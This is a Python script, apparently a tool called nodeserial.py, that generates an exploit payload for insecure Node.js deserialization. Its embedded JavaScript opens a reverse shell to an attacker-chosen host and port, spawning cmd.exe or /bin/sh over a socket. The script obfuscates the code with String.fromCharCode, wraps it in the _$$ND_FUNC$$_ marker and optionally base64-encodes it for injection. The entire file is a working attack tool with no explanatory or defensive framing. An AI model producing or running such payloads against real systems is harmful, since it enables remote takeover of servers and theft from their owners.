from argparse import RawTextHelpFormatter
import argparse, sys, base64

def main(lhost,lport,params):
    revshell_payload_nodejs = '''
        if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
        function revshell() {
            lhost="%s";
            lport="%s";
            var client = new require('net').Socket();
            client.connect(lport, lhost, function() {
                var sh = require('child_process').spawn((process.platform.contains('win')?'cmd.exe':'/bin/sh'),[]);
                client.pipe(sh.stdin);
                sh.stdout.pipe(client);
                sh.stderr.pipe(client);
            });
            client.on('error', function(e) {
                setTimeout(c(lhost,lport), 5000);
            });
        }
        revshell();
        ''' % (lhost, lport)
    payload = encode_ord(revshell_payload_nodejs)
    if args.encode == "b64":
        ok = "{\"%s\":\"_$$ND_FUNC$$_function (){eval(String.fromCharCode(%s))}()\"}" % (params,payload)
        print(base64.b64encode(ok.encode()).decode())
    else:
        print("{\"%s\":\"_$$ND_FUNC$$_function (){eval(String.fromCharCode(%s))}()\"}" % (params,payload))

def encode_ord(revshell_payload_nodejs):
    """String.CharCode"""
    encoded = ''
    for char in revshell_payload_nodejs:
        encoded = encoded + "," + str(ord(char))
    return encoded[1:]

parser = argparse.ArgumentParser(formatter_class=RawTextHelpFormatter, usage="python nodeserial.py -l <ip> -p <port>")
parser.add_argument('-l','--lhost', dest='lhost', action='store', type=str, help='Insert an lhost', required=True)
parser.add_argument('-p','--lport', dest='lport', action='store', type=str, help='Insert an lport', required=True)
parser.add_argument('-params','--params', dest='params', action='store', type=str, help='Insert an params')
parser.add_argument('-e','--encode', dest='encode', action='store', type=str, help='Insert an encode')

args=parser.parse_args()
lhost = args.lhost
lport = args.lport
params = args.params
main(lhost,lport,params)